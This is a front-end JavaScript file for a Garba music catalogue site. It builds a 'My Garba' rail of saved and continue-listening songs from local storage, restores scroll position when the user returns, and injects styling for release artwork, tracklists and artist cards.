const SESSION_KEY = 'garba:session';
const FAVOURITES_KEY = 'garba:favourites';
const NONSTOP_RESUME_KEY = 'garba:nonstop-resume:v1';
const MAX_FAVOURITES = 6;
const EXPLORE_RETURN_STATE_KEY = 'playgarbaExploreReturn';
const EXPLORE_RETURN_MAX_AGE = 2 * 60 * 60 * 1000;

const sections = document.getElementById('catalogueSections');
const catalogueCount = document.getElementById('catalogueCount');
let cataloguePromise = null;
let catalogueData = null;
let renderQueued = false;
let returnRestoreTimer = 0;

function readStoredJson(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw == null ? fallback : JSON.parse(raw);
  } catch {
    return fallback;
  }
}

function listeningState() {
  const session = readStoredJson(SESSION_KEY, {});
  const favourites = readStoredJson(FAVOURITES_KEY, []);
  const nonstopResume = readStoredJson(NONSTOP_RESUME_KEY, {});
  return {
    session: session && typeof session === 'object' ? session : {},
    favourites: Array.isArray(favourites) ? favourites.filter((id) => typeof id === 'string') : [],
    nonstopResume: nonstopResume && Array.isArray(nonstopResume.entries) ? nonstopResume.entries : [],
  };
}

function hasListeningState({ session, favourites, nonstopResume }) {
  return Boolean(session?.songId || favourites?.length || nonstopResume?.length);
}

function formatTime(seconds = 0) {
  const safe = Number.isFinite(Number(seconds)) ? Math.max(0, Math.round(Number(seconds))) : 0;
  return `${Math.floor(safe / 60)}:${String(safe % 60).padStart(2, '0')}`;
}

function releaseYear(release) {
  return Number(release?.originalReleaseYear || String(release?.releaseDate || '').slice(0, 4)) || 0;
}

function richerRelease(existing, candidate) {
  if (!existing) return candidate;
  const score = (release) => {
    const artist = String(release?.artist || '');
    return (artist.toLowerCase() !== 'various artists' ? 10 : 0)
      + Math.min(artist.length, 120) / 20
      + (Array.isArray(release?.sources) ? release.sources.length : 0)
      + (release?.label ? 1 : 0)
      + (release?.releaseDate ? 1 : 0);
  };
  return score(candidate) > score(existing) ? candidate : existing;
}

function buildReleaseIndex(releases) {
  const map = new Map();
  for (const release of releases || []) {
    if (!release?.id) continue;
    map.set(release.id, richerRelease(map.get(release.id), release));
  }
  return map;
}

const EXPLORE_PAGE_DATA_KEY = '__PLAYGARBA_EXPLORE_PAGE_DATA_V1__';
const EXPLORE_PAGE_DATA_EVENT = 'playgarba:explore-page-data-ready';
let sharedPageDataPromise = null;

function validExplorePageDataStore(store) {
  return Boolean(store && typeof store.loadCore === 'function' && typeof store.loadArtists === 'function' && typeof store.fetchJson === 'function');
}

function loadSharedPageDataStore() {
  const current = window[EXPLORE_PAGE_DATA_KEY];
  if (validExplorePageDataStore(current)) return Promise.resolve(current);
  if (!sharedPageDataPromise) {
    sharedPageDataPromise = new Promise((resolve) => {
      const resolveWhenReady = () => {
        const store = window[EXPLORE_PAGE_DATA_KEY];
        if (validExplorePageDataStore(store)) resolve(store);
      };
      window.addEventListener(EXPLORE_PAGE_DATA_EVENT, resolveWhenReady, { once: true });
      queueMicrotask(resolveWhenReady);
    });
  }
  return sharedPageDataPromise;
}

async function loadCatalogue() {
  if (catalogueData) return catalogueData;
  if (!cataloguePromise) {
    cataloguePromise = loadSharedPageDataStore()
      .then((store) => store.loadCore())
      .then(({ songs, releases, artwork }) => {
        if (!Array.isArray(songs) || !songs.length) throw new Error('Shared Explore catalogue unavailable');
        catalogueData = {
          songById: new Map(songs.filter((song) => song?.id).map((song) => [song.id, song])),
          releaseById: buildReleaseIndex(releases),
          artwork: artwork?.releases || {},
        };
        return catalogueData;
      }).finally(() => {
        if (!catalogueData) cataloguePromise = null;
      });
  }
  return cataloguePromise;
}

function initials(value = '') {
  const words = String(value).replace(/[^\p{L}\p{N} ]/gu, ' ').trim().split(/\s+/).filter(Boolean);
  if (!words.length) return 'PG';
  if (words.length === 1) {
    return (words[0].length >= 2 ? words[0].slice(0, 2) : words[0]).toUpperCase();
  }
  return (words[0][0] + words[1][0]).toUpperCase();
}

function coverFor(song, release, artwork) {
  const wrap = document.createElement('span');
  wrap.className = 'personal-listening-cover';
  const entry = artwork?.[release?.id];
  if (entry?.verified === true && entry.imageUrl) {
    const img = document.createElement('img');
    img.loading = 'lazy';
    img.decoding = 'async';
    img.alt = '';
    img.src = entry.imageUrl;
    img.addEventListener('error', () => {
      img.remove();
      wrap.classList.add('fallback');
      wrap.textContent = initials(release?.title || song?.title);
    }, { once: true });
    wrap.append(img);
  } else {
    wrap.classList.add('fallback');
    wrap.textContent = initials(release?.title || song?.title);
  }
  return wrap;
}

function playerUrl(song) {
  return `../?genre=${encodeURIComponent(song.genre || 'traditional')}&song=${encodeURIComponent(song.id)}`;
}

function primeFavouriteSession(song) {
  try {
    localStorage.setItem(SESSION_KEY, JSON.stringify({
      genreId: song.genre || 'traditional',
      songId: song.id,
      elapsed: 0,
    }));
  } catch {
    // Storage can be denied in private browsing; navigation still works.
  }
}

function makeCard({ song, release, artwork, kind, elapsed = 0 }) {
  const link = document.createElement('a');
  link.className = `personal-listening-card ${kind === 'continue' ? 'is-continue' : 'is-favourite'}`;
  link.href = playerUrl(song);
  link.setAttribute('aria-label', `${kind === 'continue' ? 'Continue listening to' : 'Listen to saved song'} ${song.title} by ${song.artist}`);
  if (kind === 'favourite') link.addEventListener('click', () => primeFavouriteSession(song));
  link.append(coverFor(song, release, artwork));

  const copy = document.createElement('span');
  copy.className = 'personal-listening-copy';
  const kicker = document.createElement('small');
  kicker.textContent = kind === 'continue' ? 'Continue listening' : 'Saved';
  const title = document.createElement('strong');
  title.textContent = song.title;
  const meta = document.createElement('span');
  const year = releaseYear(release);
  meta.textContent = [song.artist, release?.title, year || null].filter(Boolean).join(' · ');
  copy.append(kicker, title, meta);

  if (kind === 'continue') {
    const duration = Number(song.durationSeconds || 0);
    const position = Math.max(0, Number(elapsed || 0));
    if (duration > 0 && position > 0) {
      const progress = document.createElement('span');
      progress.className = 'personal-listening-progress';
      const bar = document.createElement('span');
      const fill = document.createElement('span');
      fill.style.width = `${Math.max(2, Math.min(100, position / duration * 100))}%`;
      bar.append(fill);
      const timing = document.createElement('span');
      timing.textContent = `${formatTime(position)} of ${formatTime(duration)}`;
      progress.append(bar, timing);
      copy.append(progress);
    }
  }

  link.append(copy);
  return link;
}

function makeNonstopCard({ entry }) {
  const link = document.createElement('a');
  link.className = 'personal-listening-card is-continue is-nonstop';
  link.href = `../?nonstop=${encodeURIComponent(entry.setId)}`;
  const title = entry.title || 'Nonstop Garba';
  const artist = entry.artist || 'Nonstop recording';
  link.setAttribute('aria-label', `Continue listening to Nonstop set ${title} by ${artist}`);

  const wrap = document.createElement('span');
  wrap.className = 'personal-listening-cover fallback';
  wrap.textContent = initials(title);
  link.append(wrap);

  const copy = document.createElement('span');
  copy.className = 'personal-listening-copy';
  const kicker = document.createElement('small');
  kicker.textContent = 'Continue listening · Nonstop';
  const heading = document.createElement('strong');
  heading.textContent = title;
  const meta = document.createElement('span');
  meta.textContent = `${artist} · Saved on this device`;
  copy.append(kicker, heading, meta);

  const duration = Number(entry.durationSeconds || 0);
  const position = Math.max(0, Number(entry.positionSeconds || 0));
  if (duration > 0 && position > 0) {
    const progress = document.createElement('span');
    progress.className = 'personal-listening-progress';
    const bar = document.createElement('span');
    const fill = document.createElement('span');
    fill.style.width = `${Math.max(2, Math.min(100, (position / duration) * 100))}%`;
    bar.append(fill);
    const timing = document.createElement('span');
    timing.textContent = `${formatTime(position)} of ${formatTime(duration)}`;
    progress.append(bar, timing);
    copy.append(progress);
  }

  link.append(copy);
  return link;
}

function installStyles() {
  if (document.querySelector('style[data-playgarba-listening-library]')) return;
  const style = document.createElement('style');
  style.dataset.playgarbaListeningLibrary = '';
  style.textContent = `
    .personal-listening-section{margin-bottom:42px}
    .personal-listening-section .section-title-row{margin-bottom:14px;align-items:center;justify-content:flex-start}
    .personal-listening-section .section-title-row p{margin-left:auto}
    .personal-listening-open{display:inline-flex;align-items:center;justify-content:center;flex:0 0 auto;min-height:34px;margin-left:14px;padding:0 11px;border:1px solid rgba(255,255,255,.11);border-radius:999px;color:rgba(255,248,236,.72);background:rgba(255,255,255,.035);font-size:.7rem;font-weight:760;text-decoration:none;transition:border-color .18s ease,background .18s ease,color .18s ease}
    .personal-listening-open:hover,.personal-listening-open:focus-visible{color:var(--gold);border-color:rgba(231,201,143,.28);background:rgba(231,201,143,.055)}
    .personal-listening-rail{display:grid;grid-auto-flow:column;grid-auto-columns:minmax(278px,370px);gap:14px;overflow-x:auto;overscroll-behavior-inline:contain;padding:2px 3px 12px;scroll-snap-type:x proximity;scrollbar-width:thin}
    .personal-listening-card{position:relative;display:grid;grid-template-columns:88px minmax(0,1fr);gap:14px;align-items:center;min-height:114px;padding:12px;border:1px solid rgba(255,255,255,.12);border-radius:24px;background:rgba(17,16,23,.40);color:var(--text);text-decoration:none;scroll-snap-align:start;box-shadow:inset 0 1px 0 rgba(255,255,255,.08),0 18px 54px rgba(0,0,0,.24);backdrop-filter:blur(22px) saturate(1.12);-webkit-backdrop-filter:blur(22px) saturate(1.12);transition:transform .2s ease,border-color .2s ease,background .2s ease}
    .personal-listening-card::after{content:"";position:absolute;inset:0;pointer-events:none;border-radius:inherit;background:linear-gradient(126deg,rgba(255,255,255,.05),transparent 38%,rgba(231,201,143,.04));}
    .personal-listening-card:hover{transform:translateY(-3px);border-color:rgba(231,201,143,.28);background:rgba(24,22,30,.50)}
    .personal-listening-card:focus-visible{outline:2px solid var(--gold);outline-offset:3px}
    .personal-listening-cover{position:relative;z-index:1;display:grid;place-items:center;width:88px;aspect-ratio:1;overflow:hidden;border:1px solid rgba(255,255,255,.12);border-radius:18px;background:linear-gradient(145deg,rgba(53,49,63,.92),rgba(19,18,25,.94));color:rgba(255,238,209,.80);font-size:1.08rem;font-weight:800;letter-spacing:-.04em;box-shadow:0 12px 30px rgba(0,0,0,.24)}
    .personal-listening-cover img{display:block;width:100%;height:100%;object-fit:cover}
    .personal-listening-copy{position:relative;z-index:1;display:block;min-width:0}
    .personal-listening-copy small{display:block;margin-bottom:5px;color:var(--gold);font-size:.64rem;font-weight:780;letter-spacing:.12em;text-transform:uppercase}
    .personal-listening-copy strong{display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:1rem;letter-spacing:-.025em;text-shadow:0 2px 12px rgba(0,0,0,.35)}
    .personal-listening-copy>span:not(.personal-listening-progress){display:-webkit-box;overflow:hidden;margin-top:5px;color:var(--muted);font-size:.75rem;line-height:1.35;-webkit-line-clamp:2;-webkit-box-orient:vertical}
    .personal-listening-progress{display:grid;grid-template-columns:minmax(62px,1fr) auto;gap:8px;align-items:center;margin-top:10px;color:var(--muted);font-size:.68rem}
    .personal-listening-progress>span:first-child{height:3px;overflow:hidden;border-radius:999px;background:rgba(255,248,236,.13)}
    .personal-listening-progress>span:first-child>span{display:block;height:100%;border-radius:inherit;background:var(--gold)}
    @media(max-width:640px){.personal-listening-section{margin-bottom:36px}.personal-listening-open{margin-left:auto}.personal-listening-rail{grid-auto-columns:minmax(250px,82vw);margin-right:-17px;padding-right:17px}.personal-listening-card{grid-template-columns:76px minmax(0,1fr);min-height:102px;padding:10px;border-radius:21px}.personal-listening-cover{width:76px;border-radius:15px}.personal-listening-section .section-title-row p{display:none}}
    @media(prefers-reduced-motion:reduce){.personal-listening-card{transition:none!important}}
  `;
  document.head.append(style);
}

function removeSection() {
  document.getElementById('personalListeningSection')?.remove();
}

async function renderListeningLibrary() {
  if (!sections) return;
  const stored = listeningState();
  if (!hasListeningState(stored)) {
    removeSection();
    return;
  }

  const { songById, releaseById, artwork } = await loadCatalogue();
  const continueSong = stored.session?.songId ? songById.get(stored.session.songId) : null;
  const nonstopEntry = stored.nonstopResume.length > 0 && Number(stored.nonstopResume[0]?.positionSeconds || 0) > 0
    ? stored.nonstopResume[0]
    : null;
  const seen = new Set(continueSong?.id ? [continueSong.id] : []);
  const favouriteSongs = [];
  for (const id of stored.favourites) {
    if (seen.has(id)) continue;
    const song = songById.get(id);
    if (!song) continue;
    favouriteSongs.push(song);
    seen.add(id);
    if (favouriteSongs.length >= MAX_FAVOURITES) break;
  }

  if (!continueSong && !nonstopEntry && !favouriteSongs.length) {
    removeSection();
    return;
  }

  installStyles();
  const section = document.createElement('section');
  section.id = 'personalListeningSection';
  section.className = 'catalogue-section personal-listening-section';
  section.setAttribute('aria-labelledby', 'personalListeningTitle');

  const head = document.createElement('div');
  head.className = 'section-title-row';
  const heading = document.createElement('h2');
  heading.id = 'personalListeningTitle';
  heading.textContent = 'My Garba';
  const openMyGarba = document.createElement('a');
  openMyGarba.className = 'personal-listening-open';
  openMyGarba.href = '../?library=my-garba';
  openMyGarba.textContent = 'Open';
  openMyGarba.setAttribute('aria-label', 'Open all songs in My Garba');
  head.append(heading, openMyGarba);

  const rail = document.createElement('div');
  rail.className = 'personal-listening-rail';
  rail.setAttribute('aria-label', 'My Garba saved songs and continue listening');

  if (nonstopEntry) {
    rail.append(makeNonstopCard({ entry: nonstopEntry }));
  }

  if (continueSong) {
    rail.append(makeCard({
      song: continueSong,
      release: releaseById.get(continueSong.releaseId),
      artwork,
      kind: 'continue',
      elapsed: Number(stored.session.elapsed || 0),
    }));
  }

  for (const song of favouriteSongs) {
    rail.append(makeCard({
      song,
      release: releaseById.get(song.releaseId),
      artwork,
      kind: 'favourite',
    }));
  }

  section.append(head, rail);
  removeSection();
  sections.prepend(section);
}

function catalogueReady() {
  return Boolean(sections?.querySelector('.catalogue-section'))
    && !String(catalogueCount?.textContent || '').startsWith('Loading');
}

function queueListeningRender() {
  if (renderQueued) return;
  renderQueued = true;
  queueMicrotask(() => {
    renderQueued = false;
    void renderListeningLibrary();
  });
}

function startWhenReady() {
  const stored = listeningState();
  if (!hasListeningState(stored)) return;
  if (catalogueReady()) {
    queueListeningRender();
    return;
  }
  const observer = new MutationObserver(() => {
    if (!catalogueReady()) return;
    observer.disconnect();
    queueListeningRender();
  });
  if (sections) observer.observe(sections, { childList: true, subtree: false });
  if (catalogueCount) observer.observe(catalogueCount, { childList: true, characterData: true, subtree: true });
}

function watchCatalogueRenders() {
  if (!sections) return;
  const observer = new MutationObserver(() => {
    const stored = listeningState();
    if (!hasListeningState(stored)) {
      removeSection();
      return;
    }
    if (catalogueReady() && !document.getElementById('personalListeningSection')) queueListeningRender();
  });
  observer.observe(sections, { childList: true });
}

function plainPrimaryNavigation(event) {
  return event.button === 0 && !event.metaKey && !event.ctrlKey && !event.shiftKey && !event.altKey;
}

function songIdForPlayerLink(link) {
  try {
    const destination = new URL(link.href, location.href);
    if (destination.origin !== location.origin) return null;
    return destination.searchParams.get('song');
  } catch {
    return null;
  }
}

function captureExploreReturnState(link, event) {
  const songId = songIdForPlayerLink(link);
  if (!songId) return;
  const currentState = history.state && typeof history.state === 'object' ? history.state : {};
  const songRows = document.querySelectorAll('#catalogueSongList .song-row').length;
  const context = {
    v: 1,
    at: Date.now(),
    href: location.href,
    hash: location.hash,
    songId,
    scrollY: Math.max(0, window.scrollY || 0),
    linkTop: link.getBoundingClientRect().top,
    songRows,
    restoreFocus: event.detail === 0 || document.activeElement === link,
  };
  try {
    history.replaceState({ ...currentState, [EXPLORE_RETURN_STATE_KEY]: context }, '', location.href);
  } catch {
    // History state can be unavailable in unusual embedded contexts; navigation still works.
  }
}

function currentExploreReturnState() {
  const context = history.state?.[EXPLORE_RETURN_STATE_KEY];
  if (!context || context.v !== 1 || context.href !== location.href) return null;
  if (!Number.isFinite(Number(context.at)) || Date.now() - Number(context.at) > EXPLORE_RETURN_MAX_AGE) return null;
  return context;
}

function findReturnLink(songId) {
  if (!songId) return null;
  const links = document.querySelectorAll('a.play-link[href], a.personal-listening-card[href]');
  for (const link of links) {
    if (songIdForPlayerLink(link) === songId) return link;
  }
  return null;
}

function expandSongRowsForReturn(context) {
  let link = findReturnLink(context.songId);
  let guard = 0;
  while (!link && guard < 8) {
    const rows = document.querySelectorAll('#catalogueSongList .song-row').length;
    const more = document.querySelector('#catalogueSongList .song-more');
    if (!more || (context.songRows > 0 && rows >= context.songRows)) break;
    more.click();
    guard += 1;
    link = findReturnLink(context.songId);
  }
  return link;
}

function alignReturnTarget(context, link, { focus = false } = {}) {
  if (!link?.isConnected) return;
  if (Number.isFinite(Number(context.linkTop))) {
    const delta = link.getBoundingClientRect().top - Number(context.linkTop);
    if (Math.abs(delta) > 1) window.scrollBy({ top: delta, left: 0, behavior: 'auto' });
  }
  if (focus && context.restoreFocus) link.focus({ preventScroll: true });
}

function restoreExploreReturnState(attempt = 0) {
  clearTimeout(returnRestoreTimer);
  const context = currentExploreReturnState();
  if (!context) return;
  if (!catalogueReady()) {
    if (attempt < 100) returnRestoreTimer = window.setTimeout(() => restoreExploreReturnState(attempt + 1), 50);
    return;
  }

  const link = expandSongRowsForReturn(context) || findReturnLink(context.songId);
  if (!link && attempt < 100) {
    returnRestoreTimer = window.setTimeout(() => restoreExploreReturnState(attempt + 1), 50);
    return;
  }

  window.scrollTo({ top: Math.max(0, Number(context.scrollY) || 0), left: 0, behavior: 'auto' });
  requestAnimationFrame(() => requestAnimationFrame(() => alignReturnTarget(context, findReturnLink(context.songId) || link, { focus: true })));
  window.setTimeout(() => alignReturnTarget(context, findReturnLink(context.songId) || link), 420);
}

document.addEventListener('click', (event) => {
  if (!plainPrimaryNavigation(event)) return;
  const link = event.target instanceof Element
    ? event.target.closest('a.play-link[href], a.personal-listening-card[href]')
    : null;
  if (!link || link.target || link.hasAttribute('download')) return;
  captureExploreReturnState(link, event);
}, true);

window.addEventListener('pageshow', (event) => {
  if (event.persisted) queueListeningRender();
  else restoreExploreReturnState();
});
window.addEventListener('storage', (event) => {
  if (event.key === SESSION_KEY || event.key === FAVOURITES_KEY || event.key === NONSTOP_RESUME_KEY) queueListeningRender();
});
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible' && hasListeningState(listeningState())) queueListeningRender();
});

startWhenReady();
watchCatalogueRenders();

(() => {
  const detail = document.getElementById('collectionDetail');
  const releaseRail = document.getElementById('releaseRail');
  const songList = document.getElementById('catalogueSongList');
  if (!detail || !releaseRail || !songList) return;

  let queued = false;
  let syncToken = 0;

  const releaseTrackNumberForHandoff = (song) => {
    const value = Number(song?.trackNumber);
    return Number.isFinite(value) && value > 0 ? value : null;
  };

  function selectedReleaseId() {
    if (detail.hidden) return null;
    const active = releaseRail.querySelector('.release-card.active[data-release-id]');
    return active instanceof HTMLElement ? active.dataset.releaseId || null : null;
  }

  async function syncReleaseListenHandoff() {
    queued = false;
    const releaseId = selectedReleaseId();
    const token = ++syncToken;
    const { songById } = await loadCatalogue();
    if (token !== syncToken) return;
    if (releaseId !== selectedReleaseId()) {
      queueReleaseListenHandoff();
      return;
    }

    for (const link of songList.querySelectorAll('a.play-link[href]')) {
      let destination;
      try { destination = new URL(link.href, location.href); }
      catch { continue; }
      if (destination.origin !== location.origin) continue;
      const songId = destination.searchParams.get('song');
      const song = songId ? songById.get(songId) : null;
      const validReleasePair = Boolean(
        releaseId
        && song?.releaseId === releaseId
        && releaseTrackNumberForHandoff(song) != null
      );
      if (validReleasePair) destination.searchParams.set('release', releaseId);
      else destination.searchParams.delete('release');
      const nextHref = destination.toString();
      if (link.href !== nextHref) link.href = nextHref;
      if (validReleasePair) link.dataset.releaseContext = releaseId;
      else delete link.dataset.releaseContext;
    }
  }

  function queueReleaseListenHandoff() {
    if (queued) return;
    queued = true;
    queueMicrotask(() => { void syncReleaseListenHandoff(); });
  }

  new MutationObserver(queueReleaseListenHandoff).observe(songList, {
    childList: true,
    subtree: true,
  });
  new MutationObserver(queueReleaseListenHandoff).observe(releaseRail, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['class'],
  });
  new MutationObserver(queueReleaseListenHandoff).observe(detail, {
    attributes: true,
    attributeFilter: ['hidden'],
  });
  window.addEventListener('popstate', queueReleaseListenHandoff);
  window.addEventListener('pageshow', queueReleaseListenHandoff);
  queueReleaseListenHandoff();

  document.addEventListener('click', (event) => {
    if (!plainPrimaryNavigation(event)) return;
    const link = event.target instanceof Element
      ? event.target.closest('#catalogueSongList a.play-link[href]')
      : null;
    if (!link || link.target || link.hasAttribute('download')) return;
    const releaseId = selectedReleaseId();
    if (!releaseId || link.dataset.releaseContext === releaseId) return;

    event.preventDefault();
    void (async () => {
      const { songById } = await loadCatalogue();
      let destination;
      try { destination = new URL(link.href, location.href); }
      catch { return; }
      const songId = destination.searchParams.get('song');
      const song = songId ? songById.get(songId) : null;
      if (
        song?.releaseId === releaseId
        && releaseTrackNumberForHandoff(song) != null
      ) destination.searchParams.set('release', releaseId);
      else destination.searchParams.delete('release');
      location.assign(destination.toString());
    })();
  }, true);
})();

(() => {
  const detail = document.getElementById('collectionDetail');
  const detailHead = detail?.querySelector('.detail-head');
  const releaseRail = document.getElementById('releaseRail');
  if (!detail || !detailHead || !releaseRail) return;

  const hero = document.createElement('div');
  hero.className = 'release-hero-art';
  hero.hidden = true;
  hero.setAttribute('aria-hidden', 'true');
  detailHead.prepend(hero);

  const style = document.createElement('style');
  style.dataset.playgarbaReleaseHero = '';
  style.textContent = `
    .collection-detail .detail-head[data-release-artwork="true"]{display:grid!important;grid-template-columns:clamp(132px,17vw,172px) minmax(0,1fr)!important;grid-template-areas:"art kicker" "art title" "art desc" "art meta";column-gap:clamp(20px,4vw,34px);align-items:center;text-align:left!important}
    .collection-detail .detail-head[data-release-artwork="true"] .release-hero-art{grid-area:art;align-self:center;display:block;width:100%;max-width:172px;aspect-ratio:1;overflow:hidden;border:1px solid rgba(255,255,255,.16);border-radius:24px;background:rgba(255,255,255,.045);box-shadow:0 20px 52px rgba(0,0,0,.36),inset 0 1px 0 rgba(255,255,255,.08)}
    .collection-detail .detail-head[data-release-artwork="true"] .release-hero-art img{display:block;width:100%;height:100%;object-fit:cover}
    .collection-detail .detail-head[data-release-artwork="true"] #detailKicker{grid-area:kicker;align-self:end;margin:0 0 8px;text-align:left}
    .collection-detail .detail-head[data-release-artwork="true"] #detailTitle{grid-area:title;max-width:16ch!important;margin-inline:0!important;text-align:left}
    .collection-detail .detail-head[data-release-artwork="true"] #detailDescription{grid-area:desc;max-width:620px!important;margin:11px 0 0!important;text-align:left}
    .collection-detail .detail-head[data-release-artwork="true"] #detailMeta{grid-area:meta;justify-content:flex-start!important;margin-top:14px!important}
    @media(max-width:640px){
      .collection-detail .detail-head[data-release-artwork="true"]{grid-template-columns:84px minmax(0,1fr)!important;grid-template-areas:"art kicker" "art title" "desc desc" "meta meta";column-gap:13px;align-items:center}
      .collection-detail .detail-head[data-release-artwork="true"] .release-hero-art{width:84px;max-width:84px;border-radius:15px;box-shadow:0 13px 30px rgba(0,0,0,.30),inset 0 1px 0 rgba(255,255,255,.08)}
      .collection-detail .detail-head[data-release-artwork="true"] #detailKicker{margin-bottom:5px;font-size:.62rem;line-height:1.1}
      .collection-detail .detail-head[data-release-artwork="true"] #detailTitle{max-width:14ch!important;font-size:clamp(1.65rem,8vw,2.45rem);line-height:1}
      .collection-detail .detail-head[data-release-artwork="true"] #detailDescription{margin-top:13px!important}
      .collection-detail .detail-head[data-release-artwork="true"] #detailMeta{margin-top:12px!important}
    }
    @media(max-width:380px){
      .collection-detail .detail-head[data-release-artwork="true"]{grid-template-columns:72px minmax(0,1fr)!important;column-gap:11px}
      .collection-detail .detail-head[data-release-artwork="true"] .release-hero-art{width:72px;max-width:72px;border-radius:13px}
      .collection-detail .detail-head[data-release-artwork="true"] #detailTitle{font-size:clamp(1.5rem,7.7vw,2.1rem)}
    }
    @media(prefers-reduced-motion:reduce){.release-hero-art{transition:none!important}}
  `;
  document.head.append(style);

  let syncToken = 0;
  let queued = false;

  function clearHero() {
    syncToken += 1;
    delete detailHead.dataset.releaseArtwork;
    hero.hidden = true;
    hero.removeAttribute('data-release-id');
    hero.replaceChildren();
  }

  async function syncHero() {
    queued = false;
    const active = releaseRail.querySelector('.release-card.active[data-release-id]');
    if (!(active instanceof HTMLElement) || detail.hidden) {
      clearHero();
      return;
    }
    const releaseId = active.dataset.releaseId || '';
    if (!releaseId) {
      clearHero();
      return;
    }
    if (hero.dataset.releaseId === releaseId && detailHead.dataset.releaseArtwork === 'true') return;

    const token = ++syncToken;
    const { artwork } = await loadCatalogue();
    if (token !== syncToken) return;
    const entry = artwork?.[releaseId];
    if (entry?.verified !== true || !entry.imageUrl) {
      clearHero();
      return;
    }

    const img = document.createElement('img');
    img.alt = '';
    img.decoding = 'async';
    img.loading = 'eager';
    img.fetchPriority = 'high';
    img.src = entry.imageUrl;
    img.addEventListener('error', () => {
      if (hero.dataset.releaseId === releaseId) clearHero();
    }, { once: true });

    hero.replaceChildren(img);
    hero.dataset.releaseId = releaseId;
    hero.hidden = false;
    detailHead.dataset.releaseArtwork = 'true';
  }

  function queueHeroSync() {
    if (queued) return;
    queued = true;
    queueMicrotask(() => { void syncHero(); });
  }

  new MutationObserver(queueHeroSync).observe(releaseRail, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['class'],
  });
  new MutationObserver(queueHeroSync).observe(detail, {
    attributes: true,
    attributeFilter: ['hidden'],
  });
  window.addEventListener('popstate', queueHeroSync);
  window.addEventListener('pageshow', queueHeroSync);
  queueHeroSync();
})();

(() => {
  const detail = document.getElementById('collectionDetail');
  const releaseRail = document.getElementById('releaseRail');
  const songList = document.getElementById('catalogueSongList');
  const songSectionTitle = document.getElementById('songSectionTitle');
  if (!detail || !releaseRail || !songList || !songSectionTitle) return;

  const style = document.createElement('style');
  style.dataset.playgarbaSelectedTracklist = '';
  style.textContent = `
    .collection-detail[data-selected-tracklist="true"] .song-release{display:none!important}
    .collection-detail[data-selected-tracklist="true"] .song-row{grid-template-columns:52px minmax(0,1fr) auto!important}
    .collection-detail[data-selected-tracklist="true"] .selected-release-context{display:none!important}
    .collection-detail[data-selected-tracklist="true"] .song-copy{padding-right:8px}
    .collection-detail[data-selected-tracklist="true"] .play-link{justify-self:end}
    @media(max-width:1080px){.collection-detail[data-selected-tracklist="true"] .song-row{grid-template-columns:50px minmax(0,1fr) auto!important}}
    @media(max-width:640px){.collection-detail[data-selected-tracklist="true"] .song-row{grid-template-columns:45px minmax(0,1fr) auto!important}.collection-detail[data-selected-tracklist="true"] .song-copy{padding-right:3px}}
    @media(max-width:420px){.collection-detail[data-selected-tracklist="true"] .song-row{grid-template-columns:43px minmax(0,1fr) auto!important}}
    @media(max-width:380px){.collection-detail[data-selected-tracklist="true"] .song-row{grid-template-columns:42px minmax(0,1fr) 44px!important}}
  `;
  document.head.append(style);

  let queued = false;

  function syncSelectedTracklist() {
    queued = false;
    const active = releaseRail.querySelector('.release-card.active[data-release-id]');
    const selected = active instanceof HTMLElement && !detail.hidden;
    if (!selected) {
      delete detail.dataset.selectedTracklist;
      songList.setAttribute('aria-label', 'Catalogue songs');
      return;
    }

    detail.dataset.selectedTracklist = 'true';
    const releaseTitle = active.querySelector('.release-title')?.textContent?.trim() || 'Selected release';
    songList.setAttribute('aria-label', `${releaseTitle} songs`);
    requestAnimationFrame(() => {
      const stillActive = releaseRail.querySelector('.release-card.active[data-release-id]');
      if (stillActive === active && !detail.hidden) songSectionTitle.textContent = 'Songs';
    });
  }

  function queueSelectedTracklistSync() {
    if (queued) return;
    queued = true;
    queueMicrotask(syncSelectedTracklist);
  }

  new MutationObserver(queueSelectedTracklistSync).observe(releaseRail, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeFilter: ['class'],
  });
  new MutationObserver(queueSelectedTracklistSync).observe(detail, {
    attributes: true,
    attributeFilter: ['hidden'],
  });
  window.addEventListener('popstate', queueSelectedTracklistSync);
  window.addEventListener('pageshow', queueSelectedTracklistSync);
  queueSelectedTracklistSync();
})();

(() => {
  const detail = document.getElementById('collectionDetail');
  const detailHead = detail?.querySelector('.detail-head');
  const releaseRail = document.getElementById('releaseRail');
  const detailTitle = document.getElementById('detailTitle');
  const detailKicker = document.getElementById('detailKicker');
  const detailDescription = document.getElementById('detailDescription');
  const detailMeta = document.getElementById('detailMeta');
  if (!sections || !detail || !detailHead || !releaseRail || !detailTitle || !detailKicker || !detailDescription || !detailMeta) return;

  const style = document.createElement('style');
  style.dataset.playgarbaArtistIdentity = '';
  style.textContent = `
    .collection-card.artist-collection-card .collection-image{filter:none;transform:none}
    .collection-card.artist-collection-card .collection-shade{display:none}
    .artist-card-portrait{position:relative;z-index:2;display:grid;place-items:center;width:66px;height:66px;min-width:66px;aspect-ratio:1;overflow:hidden;border:1px solid rgba(255,255,255,.20);border-radius:50%;background:linear-gradient(145deg,rgba(68,58,68,.94),rgba(20,18,26,.96));color:rgba(255,238,209,.88);font-size:1.1rem;font-weight:800;letter-spacing:-.04em;box-shadow:0 4px 14px rgba(0,0,0,.35),inset 0 1px 0 rgba(255,255,255,.16)}
    .artist-card-portrait img{display:block;width:100%;height:100%;object-fit:cover}
    .artist-card-portrait.is-fallback{border-color:rgba(231,201,143,.22);background:radial-gradient(circle at 35% 28%,rgba(231,201,143,.18),transparent 34%),linear-gradient(145deg,rgba(55,45,60,.96),rgba(16,15,21,.98))}
    .artist-collection-card .collection-copy{display:block;text-align:left}
    .artist-collection-card .collection-copy small{display:none!important}
    .artist-collection-card .collection-copy strong{max-width:none;font-size:clamp(1.02rem,1.4vw,1.25rem);line-height:1.15}
    .artist-collection-card .collection-copy span{margin-top:4px}
    .collection-detail .detail-head[data-artist-artwork="true"]{display:grid!important;grid-template-columns:clamp(132px,17vw,172px) minmax(0,1fr)!important;grid-template-areas:"artist-art artist-kicker" "artist-art artist-title" "artist-art artist-desc" "artist-art artist-meta" "artist-art artist-credit";column-gap:clamp(20px,4vw,34px);align-items:center;text-align:left!important}
